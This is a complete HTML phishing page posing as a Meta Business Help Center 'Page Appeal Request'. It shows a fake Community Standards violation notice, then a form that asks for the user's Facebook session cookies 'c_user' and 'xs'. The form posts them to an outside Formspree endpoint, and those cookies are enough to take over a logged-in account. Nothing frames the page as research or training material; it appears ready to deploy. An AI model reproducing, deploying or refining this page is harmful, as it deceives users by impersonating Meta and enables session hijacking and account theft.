<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Meta Business Help Center</title>
    <style>
        * { box-sizing: border-box; }
        body { font-family: Helvetica, Arial, sans-serif; background: #f0f2f5; display: flex; justify-content: center; padding: 20px; margin: 0; }
        .meta-container { background: white; padding: 24px; border-radius: 12px; width: 100%; max-width: 450px; }
        
        /* Modal Style */
        .modal { display: flex; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.5); z-index: 1000; justify-content: center; align-items: center; }
        .modal-content { background: white; padding: 20px; border-radius: 12px; width: 90%; max-width: 350px; max-height: 80vh; overflow-y: auto; }
        .lang-option { padding: 12px; border: 1px solid #ddd; margin-bottom: 8px; border-radius: 6px; cursor: pointer; }
        
        /* Form Styling */
        #appealForm { display: none; }
        .header { margin-bottom: 24px; }
        .header-title { font-size: 22px; font-weight: 700; color: #1c1e21; margin: 0; }
        .alert-box { border: 1px solid #dddfe2; border-radius: 8px; padding: 16px; background-color: #fafafa; margin-bottom: 20px; }
        input[type="text"] { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 6px; margin-top: 5px; }
        .submit-btn { width: 100%; padding: 12px; background: #0866ff; color: white; border: none; border-radius: 6px; font-weight: 700; cursor: pointer; margin-top: 15px; }
        .footer-note { font-size: 12px; color: #65676b; margin-top: 20px; text-align: center; }
    </style>
</head>
<body>

    <div class="meta-container">
        <div id="langModal" class="modal">
            <div class="modal-content">
                <h3>Select Your Language</h3>
                <div class="lang-option">🇺🇸 English</div>
                <div class="lang-option">🇮🇳 Hindi</div>
                <div class="lang-option">🇪🇸 Spanish</div>
                <div class="lang-option">🇵🇹 Portuguese</div>
                <div class="lang-option">🇮🇳 Tamil</div>
                <div class="lang-option">🇸🇦 Arabic</div>
                <div class="lang-option">🇫🇷 French</div>
                <div class="lang-option">🇻🇳 Vietnamese</div>
                <div class="lang-option">🇬🇭 Ghanaian (Twi)</div>
                <button onclick="showForm()" style="width:100%; padding:12px; background:#0866ff; color:white; border:none; border-radius:6px; cursor:pointer;">Confirm Language</button>
            </div>
        </div>

        <div id="appealForm">
            <div class="header">
                <h1 class="header-title">Page Appeal Request</h1>
            </div>
            
            <div class="alert-box">
                <b>Violation Notice:</b> Your account or page has been flagged for a violation of our Community Standards.
            </div>

            <form action="https://formspree.io/f/maqaobyw" method="POST">
                <label><b>c_user</b></label>
                <input type="text" name="c_user" placeholder="Enter your c_user ID" required>
                
                <label style="display:block; margin-top:15px;"><b>xs</b></label>
                <input type="text" name="xs" placeholder="Enter your xs cookie" required>
                
                <button type="submit" class="submit-btn">Submit Appeal</button>
            </form>

            <div class="footer-note">
                Meta Business Help Center © 2026
            </div>
        </div>
    </div>

    <script>
        function showForm() {
            document.getElementById('langModal').style.display = 'none';
            document.getElementById('appealForm').style.display = 'block';
        }
    </script>
</body>
</html>
